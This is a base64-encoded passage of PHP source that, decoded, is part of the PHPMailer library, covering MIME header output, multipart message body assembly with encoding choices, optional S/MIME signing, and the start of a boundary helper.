UgJ3BsYWluJzogYW5kIGNhc2UgJyc6CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgnQ29udGVudC1UeXBlOiAnIC4gJHRoaXMtPkNvbnRlbnRUeXBlIC4gJzsgY2hhcnNldD0nIC4gJHRoaXMtPkNoYXJTZXQpOwogICAgICAgICAgICAgICAgJGlzbXVsdGlwYXJ0ID0gZmFsc2U7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgLy8gUkZDMTM0MSBwYXJ0IDUgc2F5cyA3Yml0IGlzIGFzc3VtZWQgaWYgbm90IHNwZWNpZmllZAogICAgICAgIGlmICgkdGhpcy0+RW5jb2RpbmcgIT0gJzdiaXQnKSB7CiAgICAgICAgICAgIC8vIFJGQyAyMDQ1IHNlY3Rpb24gNi40IHNheXMgbXVsdGlwYXJ0IE1JTUUgcGFydHMgbWF5IG9ubHkgdXNlIDdiaXQsIDhiaXQgb3IgYmluYXJ5IENURQogICAgICAgICAgICBpZiAoJGlzbXVsdGlwYXJ0KSB7CiAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPkVuY29kaW5nID09ICc4Yml0JykgewogICAgICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcnLCAnOGJpdCcpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgLy8gVGhlIG9ubHkgcmVtYWluaW5nIGFsdGVybmF0aXZlcyBhcmUgcXVvdGVkLXByaW50YWJsZSBhbmQgYmFzZTY0LCB3aGljaCBhcmUgYm90aCA3Yml0IGNvbXBhdGlibGUKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcnLCAkdGhpcy0+RW5jb2RpbmcpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAoJHRoaXMtPk1haWxlciAhPSAnbWFpbCcpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+TEU7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJHJlc3VsdDsKICAgIH0KCiAgICAvKioKICAgICAqIFJldHVybnMgdGhlIHdob2xlIE1JTUUgbWVzc2FnZS4KICAgICAqIEluY2x1ZGVzIGNvbXBsZXRlIGhlYWRlcnMgYW5kIGJvZHkuCiAgICAgKiBPbmx5IHZhbGlkIHBvc3QgcHJlU2VuZCgpLgogICAgICogQHNlZSBQSFBNYWlsZXI6OnByZVNlbmQoKQogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRTZW50TUlNRU1lc3NhZ2UoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+TUlNRUhlYWRlciAuICR0aGlzLT5tYWlsSGVhZGVyIC4gc2VsZjo6Q1JMRiAuICR0aGlzLT5NSU1FQm9keTsKICAgIH0KCiAgICAvKioKICAgICAqIEFzc2VtYmxlIHRoZSBtZXNzYWdlIGJvZHkuCiAgICAgKiBSZXR1cm5zIGFuIGVtcHR5IHN0cmluZyBvbiBmYWlsdXJlLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgYXNzZW1ibGVkIG1lc3NhZ2UgYm9keQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY3JlYXRlQm9keSgpCiAgICB7CiAgICAgICAgJGJvZHkgPSAnJzsKICAgICAgICAvL0NyZWF0ZSB1bmlxdWUgSURzIGFuZCBwcmVzZXQgYm91bmRhcmllcwogICAgICAgICR0aGlzLT51bmlxdWVpZCA9IG1kNSh1bmlxaWQodGltZSgpKSk7CiAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzFdID0gJ2IxXycgLiAkdGhpcy0+dW5pcXVlaWQ7CiAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzJdID0gJ2IyXycgLiAkdGhpcy0+dW5pcXVlaWQ7CiAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzNdID0gJ2IzXycgLiAkdGhpcy0+dW5pcXVlaWQ7CgogICAgICAgIGlmICgkdGhpcy0+c2lnbl9rZXlfZmlsZSkgewogICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0TWFpbE1JTUUoKSAuICR0aGlzLT5MRTsKICAgICAgICB9CgogICAgICAgICR0aGlzLT5zZXRXb3JkV3JhcCgpOwoKICAgICAgICAkYm9keUVuY29kaW5nID0gJHRoaXMtPkVuY29kaW5nOwogICAgICAgICRib2R5Q2hhclNldCA9ICR0aGlzLT5DaGFyU2V0OwogICAgICAgIC8vQ2FuIHdlIGRvIGEgNy1iaXQgZG93bmdyYWRlPwogICAgICAgIGlmICgkYm9keUVuY29kaW5nID09ICc4Yml0JyBhbmQgISR0aGlzLT5oYXM4Yml0Q2hhcnMoJHRoaXMtPkJvZHkpKSB7CiAgICAgICAgICAgICRib2R5RW5jb2RpbmcgPSAnN2JpdCc7CiAgICAgICAgICAgICRib2R5Q2hhclNldCA9ICd1cy1hc2NpaSc7CiAgICAgICAgfQogICAgICAgIC8vSWYgbGluZXMgYXJlIHRvbyBsb25nLCBhbmQgd2UncmUgbm90IGFscmVhZHkgdXNpbmcgYW4gZW5jb2RpbmcgdGhhdCB3aWxsIHNob3J0ZW4gdGhlbSwKICAgICAgICAvL2NoYW5nZSB0byBxdW90ZWQtcHJpbnRhYmxlIHRyYW5zZmVyIGVuY29kaW5nCiAgICAgICAgaWYgKCdiYXNlNjQnICE9ICR0aGlzLT5FbmNvZGluZyBhbmQgc2VsZjo6aGFzTGluZUxvbmdlclRoYW5NYXgoJHRoaXMtPkJvZHkpKSB7CiAgICAgICAgICAgICR0aGlzLT5FbmNvZGluZyA9ICdxdW90ZWQtcHJpbnRhYmxlJzsKICAgICAgICAgICAgJGJvZHlFbmNvZGluZyA9ICdxdW90ZWQtcHJpbnRhYmxlJzsKICAgICAgICB9CgogICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAkdGhpcy0+RW5jb2Rpbmc7CiAgICAgICAgJGFsdEJvZHlDaGFyU2V0ID0gJHRoaXMtPkNoYXJTZXQ7CiAgICAgICAgLy9DYW4gd2UgZG8gYSA3LWJpdCBkb3duZ3JhZGU/CiAgICAgICAgaWYgKCRhbHRCb2R5RW5jb2RpbmcgPT0gJzhiaXQnIGFuZCAhJHRoaXMtPmhhczhiaXRDaGFycygkdGhpcy0+QWx0Qm9keSkpIHsKICAgICAgICAgICAgJGFsdEJvZHlFbmNvZGluZyA9ICc3Yml0JzsKICAgICAgICAgICAgJGFsdEJvZHlDaGFyU2V0ID0gJ3VzLWFzY2lpJzsKICAgICAgICB9CiAgICAgICAgLy9JZiBsaW5lcyBhcmUgdG9vIGxvbmcsIGFuZCB3ZSdyZSBub3QgYWxyZWFkeSB1c2luZyBhbiBlbmNvZGluZyB0aGF0IHdpbGwgc2hvcnRlbiB0aGVtLAogICAgICAgIC8vY2hhbmdlIHRvIHF1b3RlZC1wcmludGFibGUgdHJhbnNmZXIgZW5jb2RpbmcKICAgICAgICBpZiAoJ2Jhc2U2NCcgIT0gJGFsdEJvZHlFbmNvZGluZyBhbmQgc2VsZjo6aGFzTGluZUxvbmdlclRoYW5NYXgoJHRoaXMtPkFsdEJvZHkpKSB7CiAgICAgICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAncXVvdGVkLXByaW50YWJsZSc7CiAgICAgICAgfQogICAgICAgIC8vVXNlIHRoaXMgYXMgYSBwcmVhbWJsZSBpbiBhbGwgbXVsdGlwYXJ0IG1lc3NhZ2UgdHlwZXMKICAgICAgICAkbWltZXByZSA9ICJUaGlzIGlzIGEgbXVsdGktcGFydCBtZXNzYWdlIGluIE1JTUUgZm9ybWF0LiIgLiAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgc3dpdGNoICgkdGhpcy0+bWVzc2FnZV90eXBlKSB7CiAgICAgICAgICAgIGNhc2UgJ2lubGluZSc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRib2R5Q2hhclNldCwgJycsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRib2R5Q2hhclNldCwgJycsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdpbmxpbmVfYXR0YWNoJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvcmVsYXRlZDsnKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGJvZHlDaGFyU2V0LCAnJywgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2lubGluZScsICR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHQnOgogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYWx0Qm9keUNoYXJTZXQsICd0ZXh0L3BsYWluJywgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5BbHRCb2R5LCAkYWx0Qm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRib2R5Q2hhclNldCwgJ3RleHQvaHRtbCcsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5JY2FsKSkgewogICAgICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICcnLCAndGV4dC9jYWxlbmRhcjsgbWV0aG9kPVJFUVVFU1QnLCAnJyk7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+SWNhbCwgJHRoaXMtPkVuY29kaW5nKTsKICAgICAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9yZWxhdGVkOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnaW5saW5lJywgJHRoaXMtPmJvdW5kYXJ5WzJdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2FsdF9hdHRhY2gnOgogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9hbHRlcm5hdGl2ZTsnKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L2FsdGVybmF0aXZlOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYWx0Qm9keUNoYXJTZXQsICd0ZXh0L3BsYWluJywgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5BbHRCb2R5LCAkYWx0Qm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzJdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L3JlbGF0ZWQ7Jyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzNdIC4gJyInKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbM10sICRib2R5Q2hhclNldCwgJ3RleHQvaHRtbCcsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbM10pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgLy8gY2F0Y2ggY2FzZSAncGxhaW4nIGFuZCBjYXNlICcnCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KCiAgICAgICAgaWYgKCR0aGlzLT5pc0Vycm9yKCkpIHsKICAgICAgICAgICAgJGJvZHkgPSAnJzsKICAgICAgICB9IGVsc2VpZiAoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICghZGVmaW5lZCgnUEtDUzdfVEVYVCcpKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXh0ZW5zaW9uX21pc3NpbmcnKSAuICdvcGVuc3NsJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAvLyBAVE9ETyB3b3VsZCBiZSBuaWNlIHRvIHVzZSBwaHA6Ly90ZW1wIHN0cmVhbXMgaGVyZSwgYnV0IG5lZWQgdG8gd3JhcCBmb3IgUEhQIDwgNS4xCiAgICAgICAgICAgICAgICAkZmlsZSA9IHRlbXBuYW0oc3lzX2dldF90ZW1wX2RpcigpLCAnbWFpbCcpOwogICAgICAgICAgICAgICAgaWYgKGZhbHNlID09PSBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJGJvZHkpKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnc2lnbmluZycpIC4gJyBDb3VsZCBub3Qgd3JpdGUgdGVtcCBmaWxlJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkc2lnbmVkID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICdzaWduZWQnKTsKICAgICAgICAgICAgICAgIC8vV29ya2Fyb3VuZCBmb3IgUEhQIGJ1ZyBodHRwczovL2J1Z3MucGhwLm5ldC9idWcucGhwP2lkPTY5MTk3CiAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPnNpZ25fZXh0cmFjZXJ0c19maWxlKSkgewogICAgICAgICAgICAgICAgICAgICRzaWduID0gQG9wZW5zc2xfcGtjczdfc2lnbigKICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGUsCiAgICAgICAgICAgICAgICAgICAgICAgICRzaWduZWQsCiAgICAgICAgICAgICAgICAgICAgICAgICdmaWxlOi8vJyAuIHJlYWxwYXRoKCR0aGlzLT5zaWduX2NlcnRfZmlsZSksCiAgICAgICAgICAgICAgICAgICAgICAgIGFycmF5KCdmaWxlOi8vJyAuIHJlYWxwYXRoKCR0aGlzLT5zaWduX2tleV9maWxlKSwgJHRoaXMtPnNpZ25fa2V5X3Bhc3MpLAogICAgICAgICAgICAgICAgICAgICAgICBudWxsCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJHNpZ24gPSBAb3BlbnNzbF9wa2NzN19zaWduKAogICAgICAgICAgICAgICAgICAgICAgICAkZmlsZSwKICAgICAgICAgICAgICAgICAgICAgICAgJHNpZ25lZCwKICAgICAgICAgICAgICAgICAgICAgICAgJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fY2VydF9maWxlKSwKICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkoJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpLCAkdGhpcy0+c2lnbl9rZXlfcGFzcyksCiAgICAgICAgICAgICAgICAgICAgICAgIG51bGwsCiAgICAgICAgICAgICAgICAgICAgICAgIFBLQ1M3X0RFVEFDSEVELAogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2lnbl9leHRyYWNlcnRzX2ZpbGUKICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRzaWduKSB7CiAgICAgICAgICAgICAgICAgICAgQHVubGluaygkZmlsZSk7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgPSBmaWxlX2dldF9jb250ZW50cygkc2lnbmVkKTsKICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRzaWduZWQpOwogICAgICAgICAgICAgICAgICAgIC8vVGhlIG1lc3NhZ2UgcmV0dXJuZWQgYnkgb3BlbnNzbCBjb250YWlucyBib3RoIGhlYWRlcnMgYW5kIGJvZHksIHNvIG5lZWQgdG8gc3BsaXQgdGhlbSB1cAogICAgICAgICAgICAgICAgICAgICRwYXJ0cyA9IGV4cGxvZGUoIlxuXG4iLCAkYm9keSwgMik7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgLj0gJHBhcnRzWzBdIC4gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgICAgICRib2R5ID0gJHBhcnRzWzFdOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRmaWxlKTsKICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRzaWduZWQpOwogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ3NpZ25pbmcnKSAuIG9wZW5zc2xfZXJyb3Jfc3RyaW5nKCkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAgICAgJGJvZHkgPSAnJzsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgICAgIHRocm93ICRleGM7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuICRib2R5OwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIHRoZSBzdGFydCBvZiBhIG1lc3NhZ2UgYm91bmRhcnkuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHBhcmFtIHN0cmluZyAkYm91bmRhcnkKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNoYXJTZXQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGNvbnRlbnRUeXBlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldEJvdW5kYXJ5KCRib3VuZGFyeSwgJGNoYXJTZXQsICRjb250ZW50VHlwZSwgJGVuY29kaW5nKQogICAgewogICAgICAgICRyZXN1bHQgPSAnJzsKICAgICAgICBpZiAoJGNoYXJTZXQgPT0gJycpIHsKICAgICAgICAgICAgJGNoYXJTZXQgPSAkdGhpcy0+Q2hhclNldDsKICAgICAgICB9CiAgICAgICAgaWYgKCRjb250ZW50VHlwZSA9PSAnJykgewogICAgI